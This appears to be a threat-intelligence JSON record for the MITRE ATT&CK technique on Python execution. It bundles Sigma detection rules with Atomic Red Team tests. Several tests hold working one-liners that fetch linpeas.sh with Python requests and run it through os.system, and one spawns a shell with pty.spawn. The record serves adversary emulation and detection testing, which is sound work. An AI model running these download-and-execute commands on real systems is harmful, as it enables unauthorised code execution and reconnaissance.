{
    "id": "T1059.006",
    "name": "Python",
    "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the `python.exe` interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
    "platforms": "Linux, Windows, macOS",
    "kill_chain_phases": "Execution",
    "data_sources": "Command: Command Execution, Process: Process Creation",
    "detection": "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
    "url": "https://attack.mitre.org/techniques/T1059/006",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                    "9637e8a5-7131-4f7f-bdc7-2b05d8670c43",
                    "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                    "cc3502b5-30cc-4473-ad48-42d51a6ef6d1"
                ],
                "lookup_results": [
                    {
                        "uuid": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                        "lookup_data": {
                            "description": "Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events.",
                            "raw": "author: Pushkarev Dmitry\ndate: 2020/06/28\ndescription: Detect run not allowed files. Applocker is a very useful tool, especially\n  on servers where unprivileged users have access. For example terminal servers. You\n  need configure applocker and log collect to receive these events.\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 8004\n    - 8007\n    - 8022\n    - 8025\nfalsepositives:\n- Need tuning applocker or add exceptions in SIEM\nfields:\n- PolicyName\n- RuleId\n- RuleName\n- TargetUser\n- TargetProcessId\n- FilePath\n- FileHash\n- Fqbn\nid: 401e5d00-b944-11ea-8f9a-00163ecd60ae\nlevel: medium\nlogsource:\n  product: windows\n  service: applocker\nmodified: 2021/11/27\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker\n- https://nxlog.co/documentation/nxlog-user-guide/applocker.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.006\n- attack.t1059.007\ntitle: File Was Not Allowed To Run\n",
                            "sigma:id": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                            "title": "File Was Not Allowed To Run",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9637e8a5-7131-4f7f-bdc7-2b05d8670c43",
                        "lookup_data": {
                            "description": "Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe",
                            "raw": "author: Markus Neis, Sander Wiebing\ndate: 2018/11/22\ndescription: Detects Executables in the Downloads folder without FileVersion,Description,Product,Company\n  likely created with py2exe\ndetection:\n  condition: (selection1 or selection2 or selection3) and folder\n  folder:\n    Image|contains: \\Downloads\\\n  selection1:\n    Description: \\?\n    FileVersion: \\?\n  selection2:\n    Description: \\?\n    Product: \\?\n  selection3:\n    Company: \\?\n    Description: \\?\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 9637e8a5-7131-4f7f-bdc7-2b05d8670c43\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://securelist.com/muddywater/88059/\n- https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.006\ntitle: Suspicious File Characteristics Due to Missing Fields\n",
                            "sigma:id": "9637e8a5-7131-4f7f-bdc7-2b05d8670c43",
                            "title": "Suspicious File Characteristics Due to Missing Fields",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                        "lookup_data": {
                            "description": "FontOnLake: Previously unknown malware family targeting Linux",
                            "link": "http://www.botvrij.eu/data/feed-osint/5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1633682506",
                            "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
                        "lookup_data": {
                            "mitre-attack-id": "T1059.006",
                            "mitre-cti:description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
                            "mitre-cti:name": "Python",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'Windows', 'macOS'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1', 'type': 'attack-pattern', 'created': '2020-03-09T14:38:24.334Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1059.006', 'url': 'https://attack.mitre.org/techniques/T1059/006'}], 'modified': '2021-07-26T22:49:23.094Z', 'name': 'Python', 'description': 'Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\\n\\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}], 'x_mitre_detection': 'Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\n\\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Process: Process Creation', 'Command: Command Execution'], 'x_mitre_permissions_required': ['Administrator', 'SYSTEM', 'root'], 'x_mitre_system_requirements': ['Python is installed.']}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1059.006",
                "display_name": "Command and Scripting Interpreter: Python",
                "atomic_tests": [
                    {
                        "name": "Execute shell script via python's command mode arguement",
                        "auto_generated_guid": "3a95cdb2-c6ea-4761-b24e-02b71889b8bb",
                        "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "script_url": {
                                "description": "Shell script public URL",
                                "type": "string",
                                "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
                            },
                            "payload_file_name": {
                                "description": "Name of shell script downloaded from the script_url",
                                "type": "string",
                                "default": "T1059.006-payload"
                            },
                            "executor": {
                                "description": "FreeBSD or Linux shell",
                                "type": "string",
                                "default": "sh"
                            },
                            "script_args": {
                                "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
                                "type": "string",
                                "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Verify if python is in the environment variable path and attempt to import requests library.",
                                "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
                                "get_prereq_command": "pip install requests\n"
                            }
                        ],
                        "executor": {
                            "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
                            "name": "sh",
                            "cleanup_command": "rm #{payload_file_name} \npip-autoremove pypykatz >nul 2> nul\n"
                        }
                    },
                    {
                        "name": "Execute Python via scripts",
                        "auto_generated_guid": "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8",
                        "description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "python_script_name": {
                                "description": "Python script name",
                                "type": "path",
                                "default": "T1059.006.py"
                            },
                            "script_url": {
                                "description": "Shell script public URL",
                                "type": "string",
                                "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
                            },
                            "payload_file_name": {
                                "description": "Shell script file name downloaded from the script_url",
                                "type": "string",
                                "default": "T1059.006-payload"
                            },
                            "executor": {
                                "description": "Payload or script interpreter / executor",
                                "type": "string",
                                "default": "sh"
                            },
                            "script_args": {
                                "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
                                "type": "string",
                                "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Requires Python\n",
                                "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
                                "get_prereq_command": "pip install requests    \n"
                            }
                        ],
                        "executor": {
                            "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python #{python_script_name}\n",
                            "name": "sh",
                            "cleanup_command": "rm #{python_script_name} #{payload_file_name}  \n"
                        }
                    },
                    {
                        "name": "Execute Python via Python executables",
                        "auto_generated_guid": "0b44d79b-570a-4b27-a31f-3bf2156e5eaa",
                        "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "python_script_name": {
                                "description": "Name of Python script name",
                                "type": "path",
                                "default": "T1059.006.py"
                            },
                            "script_url": {
                                "description": "URL hosting external malicious payload",
                                "type": "string",
                                "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
                            },
                            "payload_file_name": {
                                "description": "Shell script file name downloaded from the script_url",
                                "type": "string",
                                "default": "T1059.006-payload"
                            },
                            "executor": {
                                "description": "Payload or script interpreter / executor",
                                "type": "string",
                                "default": "sh"
                            },
                            "script_args": {
                                "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
                                "type": "string",
                                "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
                            },
                            "python_binary_name": {
                                "description": "Name of Python file to be compiled",
                                "type": "path",
                                "default": "T1059.006.pyc"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Requires Python\n",
                                "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
                                "get_prereq_command": "pip install requests    \n"
                            }
                        ],
                        "executor": {
                            "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n",
                            "name": "sh",
                            "cleanup_command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}\n"
                        }
                    },
                    {
                        "name": "Python pty module and spawn function used to spawn sh or bash",
                        "auto_generated_guid": "161d694c-b543-4434-85c3-c3a433e33792",
                        "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "dependencies": [
                            {
                                "description": "Verify if python is in the environment variable path and attempt to import requests library.\n",
                                "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n",
                                "get_prereq_command": "pip install requests\n"
                            }
                        ],
                        "executor": {
                            "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit",
                            "name": "sh"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 12:08:03"
}